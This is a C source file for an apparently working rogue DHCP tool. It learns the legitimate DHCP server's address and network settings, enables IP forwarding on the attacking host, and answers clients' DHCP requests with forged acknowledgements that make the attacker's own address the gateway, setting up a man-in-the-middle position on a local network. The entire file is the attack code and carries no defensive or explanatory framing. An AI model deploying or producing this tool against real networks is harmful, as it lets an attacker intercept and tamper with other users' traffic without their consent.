#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>
#include <string.h>


#include "dhcp.h"
#include "mac.h"
#include "udp4.h"

static volatile unsigned keepRunning = 1;

static void intHandler() {
  keepRunning = 0;
}

int main(int argc, char** argv) {
  uint8_t buffer[MAC_MTU];
  raw_iface_t iface;
  int fd;
  int len;
  FILE *ip_forward;
  uint8_t *target_mac;
  macaddr_t dhcp_mac;
  ipaddr_t target_ip, client_ip, dhcp_ip, netmask, dns;
  struct in_addr myIp;

  macframe_t *frame = (macframe_t*)buffer;
  ipv4_t *ippkg = (ipv4_t*)(frame->payload);
  udp_t *udppkg;
  dhcp_t *dhcpmsg;
  uint8_t dhcptype;

  if (argc < 2) {
    fprintf(stderr, "Usage: %s <iface>\n", argv[0]);
    return 1;
  }

  if((fd = open_raw_socket(&iface, argv[1], ETH_P_IP)) < 0)
    return -1;

  if(get_ipv4_addr(&iface, &myIp) < 0)
    return -1;

  if(send_dhcp_discovery(&iface, iface.macaddr) < 0) {
    fprintf(stderr, "DHCP discovery failed\n");
    close(fd);
    return -1;
  }

  signal(SIGINT, intHandler);

  while(keepRunning) {
    if((len = recv_frame(&iface, buffer, sizeof(buffer))) < 0) {
      close(fd);
      return -1;
    }
    
    if((frame->ethertype == htons(ETH_P_IP)) &&
       (ippkg->proto == UDP_PROTO)) {
      udppkg = ipv4_payload(ippkg);
      dhcpmsg = (dhcp_t*)(udppkg->payload);
      if((udppkg->dst_port == htons(68)) &&
         (dhcp_parse_type(dhcpmsg, &dhcptype) >= 0) &&
         (dhcptype == DHCP_OFFER)) {
        if((dhcp_parse_netmask(dhcpmsg, &netmask) < 0) ||
           (dhcp_parse_dns(dhcpmsg, &dns) < 0)) {
          fprintf(stderr, "DHCP scanning failed\n");
          close(fd);
          return -1;
        } else {
          dhcp_ip = ippkg->src_ip;
          memcpy(dhcp_mac, frame->src, ETH_ALEN);
          break;
        }
      }
    }
  }

  if(!keepRunning) {
    close(fd);
    return 0;
  }
  
  // Enables ip_forward
  if(!((ip_forward = fopen("/proc/sys/net/ipv4/ip_forward", "w")) &&
       (fputc('1', ip_forward) == '1')))
    fprintf(stderr, "WARNING: Unable to set ip_forward\n");
  
  if(ip_forward)
    fclose(ip_forward);

  fprintf(stderr, "Spoofing DHCP requests\n");
  
  while(keepRunning) {
    if((len = recv_frame(&iface, buffer, sizeof(buffer))) < 0) {
      close(fd);
      return -1;
    }
    
    if((frame->ethertype == htons(ETH_P_IP)) &&
       (ippkg->proto == UDP_PROTO)) {
      udppkg = ipv4_payload(ippkg);
      dhcpmsg = (dhcp_t*)(udppkg->payload);
      if((udppkg->dst_port == htons(67)) &&
         (dhcp_parse_type(dhcpmsg, &dhcptype) >= 0) &&
         (dhcptype == DHCP_REQ) &&
         (dhcp_parse_request(dhcpmsg, &client_ip) >= 0)) {
        if((int16_t)ntohs(dhcpmsg->flags) < 0) {
          target_ip = -1;
          target_mac = broadcast_macaddr;
        } else {
          target_ip = client_ip;
          target_mac = frame->src;
        }
        send_dhcpreply(&iface, DHCP_ACK, dhcpmsg->xid,
                       dhcp_mac, dhcp_ip,
                       target_mac, target_ip,
                       myIp.s_addr, dns, netmask,
                       frame->src, client_ip);
      }
    }
  }
  
  close(fd);
  return 0;
}

/* Local Variables: */
/* mode: c */
/* tab-width: 2 */
/* indent-tabs-mode: nil */
/* End: */
